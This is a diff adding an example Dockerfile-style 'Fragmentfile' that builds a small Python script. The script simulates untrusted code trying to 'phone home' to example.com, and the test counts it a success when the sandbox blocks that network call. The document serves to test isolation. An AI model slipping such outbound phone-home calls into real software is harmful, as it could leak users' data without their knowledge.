@@ -1,0 +1,23 @@
+# An example Fragmentfile (Similar to Dockerfile)
+
+# Pull from standard OCI registry
+FROM python:3.11-alpine
+
+# Set up our working directory inside the fragment
+WORKDIR /app
+
+# The "untrusted" script we are running that might try to phone home
+RUN echo 'import urllib.request' > evil_script.py
+RUN echo 'import sys' >> evil_script.py
+RUN echo 'print("Starting data processing...")' >> evil_script.py
+RUN echo 'try:' >> evil_script.py
+RUN echo '    # Simulate malware trying to exfiltrate data or download a payload' >> evil_script.py
+RUN echo '    urllib.request.urlopen("http://example.com/phone-home", timeout=3)' >> evil_script.py
+RUN echo '    print("OH NO! Network access succeeded. We have been compromised!")' >> evil_script.py
+RUN echo '    sys.exit(1)' >> evil_script.py
+RUN echo 'except Exception as e:' >> evil_script.py
+RUN echo '    print(f"Network request failed as expected: {e}")' >> evil_script.py
+RUN echo '    print("Executing secure data processing safely...")' >> evil_script.py
+
+# When the fragment is run, execute this script
+CMD ["python", "evil_script.py"]
